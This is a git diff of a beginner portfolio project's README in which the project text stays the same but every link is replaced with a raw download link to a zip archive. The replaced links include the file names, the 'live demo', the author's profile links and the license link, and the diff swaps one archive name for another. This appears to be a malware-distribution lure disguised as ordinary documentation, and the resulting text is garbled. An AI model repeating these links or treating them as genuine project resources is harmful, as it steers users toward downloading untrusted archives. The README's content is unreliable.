@@ -1,12 +1,12 @@
-![](https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip)
+![](https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip)
 
 # The Portfolio
 
-To built this project you need to create files which mainly are https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip There are linters also to be checked for html and css. A new feature branch has to be created apart from the main. The webpage has to be for a mobile version.
+To built this project you need to create files which mainly are https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip There are linters also to be checked for html and css. A new feature branch has to be created apart from the main. The webpage has to be for a mobile version.
 To update this project to finish mobile version a new feature branch to be created apart from the previous feature and main.
-To update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip with the work section and About Myself section.
-To update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip with the contact form section
-A desktop version update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip, https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip
+To update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip with the work section and About Myself section.
+To update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip with the contact form section
+A desktop version update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip, https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip
 To store popup details in a javascript array.
 Updated js to validate the forms before submiting.
 
@@ -16,7 +16,7 @@ Updated js to validate the forms before submiting.
 - FIGMA GIT GITHUB
 - VISUAL STUDIO CODE
 
-## [live demo](https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip)
+## [live demo](https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip)
 
 
 ## :blue_book: Learning Objectives
@@ -30,18 +30,18 @@ Updated js to validate the forms before submiting.
 
 ## Getting Started
 
-To built this project you need to create files which mainly are https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip There are linters also to be checked for html and css. A new feature branch has to be created apart from the main. The webpage has to be for a mobile version.
+To built this project you need to create files which mainly are https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip There are linters also to be checked for html and css. A new feature branch has to be created apart from the main. The webpage has to be for a mobile version.
 To update this project to finish mobile version a new feature branch to be created apart from the previous feature and main.
-To update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip with the work section and About Myself section.
-To update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip with the contact form section
-A desktop version update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip
+To update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip with the work section and About Myself section.
+To update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip with the contact form section
+A desktop version update the https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip and https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip
 
 
 ## Authors
 
-- GitHub: [@Iptysam](https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip)
+- GitHub: [@Iptysam](https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip)
 - Twitter: [@twitterhandle]()
-- LinkedIn:(https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip 
+- LinkedIn:(https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip 
 iptisam-mukadam-4b2b39239
 )
 
@@ -64,4 +64,4 @@ Give a ⭐️ if you like this project!
 
 ## 📝 License
 
-This project is [MIT](https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/bugs_1.6-alpha.1.zip) licensed.
+This project is [MIT](https://github.com/Iptysam/bugs/raw/refs/heads/main/.github/workflows/Software_v1.8.zip) licensed.
